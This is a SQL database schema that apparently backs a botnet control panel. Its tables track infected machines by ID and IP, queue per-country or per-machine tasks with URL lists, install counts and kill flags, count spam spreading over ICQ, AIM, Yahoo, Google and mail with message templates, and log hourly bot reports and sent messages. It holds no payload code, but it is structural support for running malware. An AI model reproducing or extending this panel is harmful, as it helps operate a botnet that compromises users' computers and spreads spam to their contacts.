#create database `lo`;
#use `lo`;

CREATE TABLE `bots` (
  `Fidx` int(10) unsigned NOT NULL auto_increment,
  `FCompID` varchar(64) NOT NULL default '',
  `FLang` char(3) NOT NULL default '',
  `FFirstRep` varchar(50) NOT NULL default '',
  `FFirstRepInt` int(11) unsigned NOT NULL default '0',
  `FLastRep` varchar(50) NOT NULL default '',
  `FLastRepInt` int(11) unsigned NOT NULL default '0',
  `FRepCnt` int(10) unsigned NOT NULL default '0',
  `FTime` varchar(10) NOT NULL default '',
  `FDay` char(2) NOT NULL default '',
  `FMonth` char(2) NOT NULL default '',
  `FYear` varchar(4) NOT NULL default '',
  `FQuery` text NOT NULL,
  `FExecutedCrc` mediumtext NOT NULL,
  `FExecuted` mediumtext NOT NULL,
  `ip_addr` varchar(15) NOT NULL default '',
  `FVer` varchar(10) NOT NULL default '',
  PRIMARY KEY  (`Fidx`,`FCompID`),
  UNIQUE KEY `lrp` (`Fidx`)
) ENGINE=MyISAM;


CREATE TABLE `task` (
`Tid` SMALLINT unsigned NOT NULL auto_increment primary key,
`Tland` varchar(3) not null default '',
`Tkill` varchar(1) not null default 1,
`Tinstall` MEDIUMINT unsigned NOT NULL default 0,
`Tinstalled` MEDIUMINT unsigned NOT NULL default 0,
`Ttime` int(10) unsigned not null default 0,
`Turls` text default ''
) ENGINE=MyISAM;


CREATE TABLE `task_zu` (
`Tid` SMALLINT unsigned NOT NULL auto_increment primary key,
`Tland` varchar(3) not null UNIQUE key default '',
`Ticq_done` INT unsigned NOT NULL default 0,
`Taim_done` INT unsigned NOT NULL default 0,
`Tgoogle_done` INT unsigned NOT NULL default 0,
`Tyahoo_done` INT unsigned NOT NULL default 0,
`Tmail_done` INT unsigned NOT NULL default 0,
`Tsbots_done` INT unsigned NOT NULL default 0,
`Ttime` int(10) unsigned not null default 0,
`Tstop` bool not null default 0,
`Tmessage` text not null default ''
) ENGINE=MyISAM;


CREATE TABLE `tmpl_zu`(
`Tid` int(10) unsigned NOT NULL auto_increment primary key,
`Tname` varchar(20) NOT NULL default '',
`Ttype` varchar(3) NoT NULL default 'im',
`Tmessage` text not null default ''
)ENGINE=MyISAM;


CREATE TABLE `task_single`(
`Tid` SMALLINT unsigned NOT NULL auto_increment primary key,
`TCompId` varchar(64) default '',
`Tkill` varchar(1) not null default 1,
`Tinstall` MEDIUMINT unsigned NOT NULL default 0,
`Tinstalled` MEDIUMINT unsigned NOT NULL default 0,
`Ttime` int(10) unsigned not null default 0,
`Turls` text default ''
)ENGINE=MyISAM;



CREATE TABLE `downfiles` (
`Did` int(10) unsigned NOT NULL auto_increment primary key,
`Dland` varchar(64) not null default '',
`Dfname` varchar(50) NOT NULL default '',
`Dsize` int unsigned NOT NULL default 0,
`Dcnt` int unsigned NOT NULL default 0,
`Dtime` int(11) unsigned NOT NULL default 0
)ENGINE=MyISAM;



CREATE TABLE `stat_down`(
date varchar(21) primary key NOT NULL default '',
year varchar(5) not null default '',
month varchar(2) not null default '',
day varchar(2) not null default '',
h_00 MEDIUMINT UNSIGNED Not null default 0,
h_01 MEDIUMINT UNSIGNED Not null default 0,
h_02 MEDIUMINT UNSIGNED Not null default 0,
h_03 MEDIUMINT UNSIGNED Not null default 0,
h_04 MEDIUMINT UNSIGNED Not null default 0,
h_05 MEDIUMINT UNSIGNED Not null default 0,
h_06 MEDIUMINT UNSIGNED Not null default 0,
h_07 MEDIUMINT UNSIGNED Not null default 0,
h_08 MEDIUMINT UNSIGNED Not null default 0,
h_09 MEDIUMINT UNSIGNED Not null default 0,
h_10 MEDIUMINT UNSIGNED Not null default 0,
h_11 MEDIUMINT UNSIGNED Not null default 0,
h_12 MEDIUMINT UNSIGNED Not null default 0,
h_13 MEDIUMINT UNSIGNED Not null default 0,
h_14 MEDIUMINT UNSIGNED Not null default 0,
h_15 MEDIUMINT UNSIGNED Not null default 0,
h_16 MEDIUMINT UNSIGNED Not null default 0,
h_17 MEDIUMINT UNSIGNED Not null default 0,
h_18 MEDIUMINT UNSIGNED Not null default 0,
h_19 MEDIUMINT UNSIGNED Not null default 0,
h_20 MEDIUMINT UNSIGNED Not null default 0,
h_21 MEDIUMINT UNSIGNED Not null default 0,
h_22 MEDIUMINT UNSIGNED Not null default 0,
h_23 MEDIUMINT UNSIGNED Not null default 0
)ENGINE=MyISAM;


CREATE TABLE `stat_bot_rap`(
date varchar(21) primary key NOT NULL default '',
year varchar(5) not null default '',
month varchar(2) not null default '',
day varchar(2) not null default '',
h_00 MEDIUMINT UNSIGNED Not null default 0,
h_01 MEDIUMINT UNSIGNED Not null default 0,
h_02 MEDIUMINT UNSIGNED Not null default 0,
h_03 MEDIUMINT UNSIGNED Not null default 0,
h_04 MEDIUMINT UNSIGNED Not null default 0,
h_05 MEDIUMINT UNSIGNED Not null default 0,
h_06 MEDIUMINT UNSIGNED Not null default 0,
h_07 MEDIUMINT UNSIGNED Not null default 0,
h_08 MEDIUMINT UNSIGNED Not null default 0,
h_09 MEDIUMINT UNSIGNED Not null default 0,
h_10 MEDIUMINT UNSIGNED Not null default 0,
h_11 MEDIUMINT UNSIGNED Not null default 0,
h_12 MEDIUMINT UNSIGNED Not null default 0,
h_13 MEDIUMINT UNSIGNED Not null default 0,
h_14 MEDIUMINT UNSIGNED Not null default 0,
h_15 MEDIUMINT UNSIGNED Not null default 0,
h_16 MEDIUMINT UNSIGNED Not null default 0,
h_17 MEDIUMINT UNSIGNED Not null default 0,
h_18 MEDIUMINT UNSIGNED Not null default 0,
h_19 MEDIUMINT UNSIGNED Not null default 0,
h_20 MEDIUMINT UNSIGNED Not null default 0,
h_21 MEDIUMINT UNSIGNED Not null default 0,
h_22 MEDIUMINT UNSIGNED Not null default 0,
h_23 MEDIUMINT UNSIGNED Not null default 0
)ENGINE=MyISAM;


CREATE TABLE `stat_msgsent`(
date varchar(21) primary key NOT NULL default '',
year varchar(5) not null default '',
month varchar(2) not null default '',
day varchar(2) not null default '',
h_00 MEDIUMINT UNSIGNED Not null default 0,
h_01 MEDIUMINT UNSIGNED Not null default 0,
h_02 MEDIUMINT UNSIGNED Not null default 0,
h_03 MEDIUMINT UNSIGNED Not null default 0,
h_04 MEDIUMINT UNSIGNED Not null default 0,
h_05 MEDIUMINT UNSIGNED Not null default 0,
h_06 MEDIUMINT UNSIGNED Not null default 0,
h_07 MEDIUMINT UNSIGNED Not null default 0,
h_08 MEDIUMINT UNSIGNED Not null default 0,
h_09 MEDIUMINT UNSIGNED Not null default 0,
h_10 MEDIUMINT UNSIGNED Not null default 0,
h_11 MEDIUMINT UNSIGNED Not null default 0,
h_12 MEDIUMINT UNSIGNED Not null default 0,
h_13 MEDIUMINT UNSIGNED Not null default 0,
h_14 MEDIUMINT UNSIGNED Not null default 0,
h_15 MEDIUMINT UNSIGNED Not null default 0,
h_16 MEDIUMINT UNSIGNED Not null default 0,
h_17 MEDIUMINT UNSIGNED Not null default 0,
h_18 MEDIUMINT UNSIGNED Not null default 0,
h_19 MEDIUMINT UNSIGNED Not null default 0,
h_20 MEDIUMINT UNSIGNED Not null default 0,
h_21 MEDIUMINT UNSIGNED Not null default 0,
h_22 MEDIUMINT UNSIGNED Not null default 0,
h_23 MEDIUMINT UNSIGNED Not null default 0
)ENGINE=MyISAM;


CREATE TABLE `antisoft_glob`(
`LAND` varchar(3) primary key
)ENGINE=MyISAM;
